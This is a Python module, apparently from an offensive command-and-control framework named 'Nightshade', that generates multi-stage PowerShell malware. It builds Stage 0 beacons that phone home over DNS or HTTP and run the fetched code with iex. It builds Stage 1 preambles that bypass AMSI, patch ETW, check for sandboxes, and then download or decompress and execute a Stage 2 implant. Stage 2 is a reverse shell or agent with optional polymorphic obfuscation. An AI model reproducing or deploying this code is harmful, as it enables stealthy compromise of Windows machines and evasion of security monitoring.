"""
Nightshade Multi-Stage Payload System.
Generates Stage 0 (tiny beacon), Stage 1 (evasion preamble + download),
and Stage 2 (actual implant) payloads. Each stage can be independently
regenerated per campaign for operational diversity.
"""
import random
import string
import time
from typing import Optional

from ..core.evasion import EvasionGenerator
from ..core.obfuscation import PSObfuscator


class Stage0Generator:
    """Generates a tiny beacon stub with zero malicious static signature.
    
    Stage 0 sleeps 3-8 seconds, then phones home via DNS A/AAAA query
    or simple HTTP GET to retrieve the next stage. Contains no shellcode,
    no suspicious API calls visible to static analysis.
    """

    @staticmethod
    def _rand_var() -> str:
        return '_' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))

    @staticmethod
    def dns_beacon(c2_domain: str, campaign_id: str) -> str:
        """Generate a DNS-based Stage 0 beacon that resolves a subdomain to check in."""
        v = Stage0Generator._rand_var()
        v2 = Stage0Generator._rand_var()
        v3 = Stage0Generator._rand_var()

        return f'''
# Stage 0 beacon - DNS check-in
${v} = Get-Random -Minimum 3 -Maximum 8
Start-Sleep -Seconds ${v}

# DNS check-in: resolve campaign subdomain as A record check-in
${v2} = "{campaign_id}.{c2_domain}"
${v3} = [System.Net.Dns]::GetHostAddresses(${v2})

if (${v3}) {{
    # Resolved - checking for next stage via TXT record
    try {{
        ${v2} = "stage1.{campaign_id}.{c2_domain}"
        ${v3} = [System.Net.Dns]::GetHostAddresses(${v2})
        if (${v3}) {{
            # Stage 1 is available - proceed
            ${v} = "1"
        }}
    }} catch {{}}
}}
'''.strip()

    @staticmethod
    def http_beacon(c2_url: str, session_id: str) -> str:
        """Generate an HTTP-based Stage 0 beacon stub."""
        v = Stage0Generator._rand_var()
        v2 = Stage0Generator._rand_var()
        v3 = Stage0Generator._rand_var()
        v4 = Stage0Generator._rand_var()

        return f'''
# Stage 0 beacon
${v} = Get-Random -Minimum 3 -Maximum 8
Start-Sleep -Seconds ${v}

# Phone home for Stage 1
${v2} = "{c2_url}/stage0/{session_id}"
${v3} = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

try {{
    ${v4} = Invoke-WebRequest -Uri ${v2} -Headers @{{"User-Agent"=${v3}}} -UseBasicParsing -TimeoutSec 10
    if (${v4}.StatusCode -eq 200) {{
        iex ${v4}.Content
    }}
}} catch {{
    try {{
        ${v4} = (New-Object Net.WebClient).DownloadString(${v2})
        iex ${v4}
    }} catch {{}}
}}
'''.strip()

    @staticmethod
    def generate(c2_url: str, session_id: str, use_dns: bool = False, c2_domain: str = "") -> str:
        """Generate a complete Stage 0 beacon stub."""
        if use_dns and c2_domain:
            return Stage0Generator.dns_beacon(c2_domain, session_id[:16])
        return Stage0Generator.http_beacon(c2_url, session_id)


class Stage1Generator:
    """Generates the evasion preamble with AMSI bypass, sandbox check, ETW patch,
    then downloads and executes Stage 2. Includes longer sleep with jitter."""

    @staticmethod
    def _rand_var() -> str:
        return '_' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))

    @staticmethod
    def generate(
        c2_url: str,
        session_id: str,
        stage2_url: str = "",
        min_sleep: int = 10,
        max_sleep: int = 30,
    ) -> str:
        """Generate Stage 1: evasion preamble + jitter + stage 2 download."""
        if not stage2_url:
            stage2_url = f"{c2_url}/stage1/{session_id}"

        evasion = EvasionGenerator()
        v = Stage1Generator._rand_var()
        v2 = Stage1Generator._rand_var()
        v3 = Stage1Generator._rand_var()
        v4 = Stage1Generator._rand_var()
        v5 = Stage1Generator._rand_var()

        amsi = evasion.random_amsi_bypass()
        etw = evasion.ETW_BYPASS
        sandbox = evasion.SANDBOX_CHECKS

        return f'''
# Stage 1 - Evasion preamble
{amsi}

{etw}

{sandbox}

# Jitter sleep before Stage 2
${v} = Get-Random -Minimum {min_sleep} -Maximum {max_sleep}
Start-Sleep -Seconds ${v}

# Download and execute Stage 2
${v2} = "{stage2_url}"
${v3} = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

try {{
    ${v4} = Invoke-WebRequest -Uri ${v2} -Headers @{{"User-Agent"=${v3}}} -UseBasicParsing -TimeoutSec 30
    if (${v4}.StatusCode -eq 200) {{
        ${v5} = ${v4}.Content
        iex ${v5}
    }}
}} catch {{
    try {{
        ${v5} = (New-Object Net.WebClient).DownloadString(${v2})
        iex ${v5}
    }} catch {{}}
}}
'''.strip()

    @staticmethod
    def generate_compressed(c2_url: str, session_id: str, stage2_b64: str) -> str:
        """Generate Stage 1 with embedded compressed Stage 2 (no network needed for stage 2)."""
        evasion = EvasionGenerator()
        v = Stage1Generator._rand_var()
        v2 = Stage1Generator._rand_var()
        v3 = Stage1Generator._rand_var()
        v4 = Stage1Generator._rand_var()

        amsi = evasion.random_amsi_bypass()
        etw = evasion.ETW_BYPASS
        sandbox = evasion.SANDBOX_CHECKS

        return f'''
# Stage 1 - Evasion preamble (embedded Stage 2)
{amsi}

{etw}

{sandbox}

# Jitter sleep
${v} = Get-Random -Minimum 10 -Maximum 30
Start-Sleep -Seconds ${v}

# Decompress and execute Stage 2
${v2} = [System.Convert]::FromBase64String("{stage2_b64}")
${v3} = New-Object System.IO.MemoryStream(${v2}, 0, ${v2}.Length)
${v4} = New-Object System.IO.Compression.GZipStream(${v3}, [System.IO.Compression.CompressionMode]::Decompress)
${v} = New-Object System.IO.StreamReader(${v4})
iex(${v}.ReadToEnd())
'''.strip()


class Stage2Generator:
    """Generates the actual implant payload: reverse shell, RCE beacon, or full agent."""

    @staticmethod
    def generate(
        tier: int = 2,
        c2_url: str = "http://127.0.0.1:8080",
        session_id: str = "",
        target_host: str = "127.0.0.1",
        target_port: int = 4444,
    ) -> str:
        """Generate Stage 2 payload (delegates to PowerShellPayloadFactory)."""
        from ..payloads.powershell import PowerShellPayloadFactory
        crypto = None
        # Use a simple pass-through; Stage 2 should be post-evasion

        ps_factory = PowerShellPayloadFactory(
            crypto=None,  # type: ignore
            c2_url=c2_url,
            session_id=session_id,
        )
        return ps_factory.generate(tier=tier, target_host=target_host, target_port=target_port)

    @staticmethod
    def obfuscated_stage2(
        tier: int = 2,
        c2_url: str = "http://127.0.0.1:8080",
        session_id: str = "",
        target_host: str = "127.0.0.1",
        target_port: int = 4444,
        obfuscation_layers: int = 3,
    ) -> str:
        """Generate Stage 2 with polymorphic obfuscation applied."""
        raw = Stage2Generator.generate(tier, c2_url, session_id, target_host, target_port)
        obs = PSObfuscator()
        return obs.obfuscate(raw, layers=obfuscation_layers)

    @staticmethod
    def compressed_stage2(
        tier: int = 2,
        c2_url: str = "http://127.0.0.1:8080",
        session_id: str = "",
        target_host: str = "127.0.0.1",
        target_port: int = 4444,
    ) -> str:
        """Generate GZip+base64 compressed Stage 2 for embedding in Stage 1."""
        raw = Stage2Generator.generate(tier, c2_url, session_id, target_host, target_port)
        import zlib, base64
        compressed = zlib.compress(raw.encode(), 9)[2:-4]  # strip zlib header
        return base64.b64encode(compressed).decode()
